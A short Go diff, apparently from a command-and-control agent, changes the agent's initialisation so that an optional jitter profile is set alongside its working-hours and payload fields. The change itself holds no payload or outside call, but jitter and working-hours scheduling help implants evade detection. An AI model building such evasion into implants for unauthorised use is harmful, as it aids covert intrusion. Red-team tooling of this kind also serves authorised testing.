@@ -168,7 +168,7 @@ func validateConfig(cfg parsedConfig) bool {
 
 // initializeAgent creates the Agent struct from parsed config and system info.
 func initializeAgent(cfg parsedConfig) *structs.Agent {
-	return &structs.Agent{
+	a := &structs.Agent{
 		PayloadUUID:       payloadUUID,
 		Architecture:      runtime.GOARCH,
 		Domain:            "",
@@ -188,6 +188,10 @@ func initializeAgent(cfg parsedConfig) *structs.Agent {
 		WorkingHoursEnd:   cfg.whEndMinutes,
 		WorkingDays:       cfg.whDays,
 	}
+	if jitterProfile != "" {
+		a.JitterProfile = jitterProfile
+	}
+	return a
 }
 
 // applySecurity runs startup security patches based on build-time flags.
